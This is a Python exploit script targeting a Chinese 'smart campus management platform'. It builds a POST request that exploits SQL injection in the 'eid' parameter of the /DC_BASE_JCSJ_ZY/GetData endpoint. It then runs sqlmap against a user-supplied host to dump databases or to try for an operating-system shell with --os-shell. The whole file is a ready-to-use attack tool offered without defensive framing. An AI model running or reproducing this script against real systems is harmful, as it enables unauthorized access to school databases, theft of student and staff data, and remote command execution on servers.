#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import os, argparse, time

def title():
    print("")
    print('*'.center(60, '*'))
    print("Version：某智慧校园管理平台".center(40))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(50))
    print("")
    print('*'.center(60, '*'))
    print("")

def general_School_system_SQLmap_exp(url):
    postdata = '''POST /DC_BASE_JCSJ_ZY/GetData HTTP/1.1
Host: {0}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 5

eid=1'''.format(url)
    file = open('postdata.txt', 'w')
    file.write(postdata)
    file.close
    print("")
    print("[+] postdata数据包创建成功！")
    time.sleep(3)
    print("")
    return True

def SQLmap_attack():
    X = input("\n攻击选项：\n    爆破数据库：1 \n    尝试一键get-shell：2\n 请输入选项(1|2)：")
    if X == '1':
        #get_db = "sqlmap -r postdata.txt --dbs --hex --tamper=space2comment"
        get_db = "python D:\\hacking\\afei_hack_tools\\afei_hack_tools\\webshell\\K8fly\\Web-Exp\\sqlmap\\sqlmap.py -r postdata.txt --dbs --hex --tamper=space2comment"
        print("[+] 正在调用SQLmap进行爆库...".center(50, '-'))
        flag = os.system(get_db)
    elif X == '2':
        #get_shell = "sqlmap -r postdata.txt --os-shell --hex --tamper=space2comment"
        get_shell = "python D:\\hacking\\afei_hack_tools\\afei_hack_tools\\webshell\\K8fly\\Web-Exp\\sqlmap\\sqlmap.py -r postdata.txt --os-shell --hex --tamper=space2comment"
        print("[+] 正在调用SQLmap --os-shell...".center(50, '-'))
        flag = os.system(get_shell)
    else:
        print("Input Error！Must 1 or 2")
        exit()
    return True

if(__name__ == '__main__'):
    title()
    parser = argparse.ArgumentParser(description="general_School_system_SQLmap_exp Script")
    parser.add_argument(
        '-H', '--host',
        metavar='', required='True',
        help='Please input target Host. eg: ip:port'
    )
    args = parser.parse_args()
    general_School_system_SQLmap_exp(args.host)
    SQLmap_attack()